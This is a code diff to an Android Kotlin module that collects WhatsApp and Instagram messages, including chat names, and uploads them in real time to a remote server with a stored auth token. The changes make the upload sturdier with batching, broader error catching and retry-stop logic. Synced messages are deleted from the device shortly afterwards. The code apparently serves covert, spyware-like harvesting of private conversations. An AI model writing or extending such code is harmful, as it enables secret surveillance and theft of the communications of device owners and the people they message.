@@ -349,9 +349,14 @@ object RealtimeLogObserverManager {
                 val state = DeviceState(context)
                 val bearer = state.authToken?.let { "Bearer $it" } ?: return
 
-                // Upload any unsynced WhatsApp messages immediately
-                val unsynced = db.whatsAppMessageDao().getUnsynced()
-                if (unsynced.isNotEmpty()) {
+                try {
+                    db.whatsAppMessageDao().clearOversizedUnsyncedBlobs()
+                } catch (_: Throwable) {}
+
+                for (batch in 0 until 5) {
+                    val unsynced = db.whatsAppMessageDao().getUnsynced(50)
+                    if (unsynced.isEmpty()) break
+
                     val dtos = unsynced.map {
                         WhatsAppMessageEntryDto(
                             chatName = it.chatName,
@@ -367,14 +372,16 @@ object RealtimeLogObserverManager {
                     val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
                     if (response.isSuccessful) {
                         db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
-                        // Minimize device storage: purge synced messages to avoid taking phone storage
                         db.whatsAppMessageDao().pruneSyncedMessages(System.currentTimeMillis() - 10 * 60 * 1000L)
                         db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 60 * 60 * 1000L)
                         Log.d(TAG, "Smart Flush: Uploaded ${dtos.size} WhatsApp messages to server")
+                    } else {
+                        Log.w(TAG, "WhatsApp upload failed HTTP ${response.code()}")
+                        break
                     }
                 }
                 Unit
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 Log.e(TAG, "Error in real-time WhatsApp upload", e)
             }
         }
@@ -399,8 +406,10 @@ object RealtimeLogObserverManager {
                 val state = DeviceState(context)
                 val bearer = state.authToken?.let { "Bearer $it" } ?: return
 
-                val unsynced = db.instagramMessageDao().getUnsynced()
-                if (unsynced.isNotEmpty()) {
+                for (batch in 0 until 5) {
+                    val unsynced = db.instagramMessageDao().getUnsynced(50)
+                    if (unsynced.isEmpty()) break
+
                     val dtos = unsynced.map {
                         InstagramMessageEntryDto(
                             chatName = it.chatName,
@@ -422,10 +431,13 @@ object RealtimeLogObserverManager {
                         db.instagramMessageDao().markSynced(unsynced.map { it.id })
                         db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
                         Log.d(TAG, "Instantly uploaded ${dtos.size} Instagram messages to server")
+                    } else {
+                        Log.w(TAG, "Instagram upload failed HTTP ${response.code()}")
+                        break
                     }
                 }
                 Unit
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 Log.e(TAG, "Error in real-time Instagram upload", e)
             }
         }
